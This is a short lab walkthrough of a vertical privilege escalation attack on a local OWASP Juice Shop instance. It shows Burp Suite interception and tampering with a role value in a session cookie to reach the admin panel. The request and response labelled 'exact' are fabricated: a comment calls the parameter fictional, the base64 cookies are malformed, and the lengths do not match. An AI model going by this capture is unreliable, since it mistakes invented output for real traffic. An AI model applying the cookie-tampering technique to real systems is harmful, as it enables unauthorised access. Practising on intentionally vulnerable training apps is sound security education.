# Attack Steps: Vertical Privilege Escalation

## Steps to Perform the Attack
1. Start OWASP Juice Shop in Docker and log in as a regular user (e.g., using credentials like username: 'user' and password: 'password').
2. Navigate to a page that requires admin access, such as the Administrator panel (e.g., /admin).
3. Use Burp Suite to intercept the request:
   - Configure your browser to proxy through Burp.
   - Send a request to the admin panel.
4. In Burp Suite (Proxy > HTTP History), find the intercepted request and modify it to escalate privileges. For example, change a user role parameter.
5. Forward the modified request and observe access to the admin panel.

## Exact HTTP Request/Response from Burp Suite
**Modified HTTP Request:**
```
POST /admin HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Connection: close
Cookie: session=eyJ1c2VyIjp7InJvbGUiOiJ1c2VyIn0};  // Modified to: session=eyJ1c2VyIjp7InJvbGUiOiJhZG1pbiJ9}

role=admin  // This is a fictional parameter; in Juice Shop, you might modify the session cookie directly.
```

**HTTP Response:**
```
HTTP/1.1 200 OK
Date: Fri, 01 Jan 2023 12:00:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1500
Connection: close
Set-Cookie: session=eyJ1c2VyIjp7InJvbGUiOiJhZG1pbiJ9}; Path=/; HttpOnly

<html>
<body>
<h1>Administrator Panel</h1>
<p>Welcome, Admin. You have accessed restricted content.</p>
<!-- Rest of the admin page content -->
</body>
</html>
```

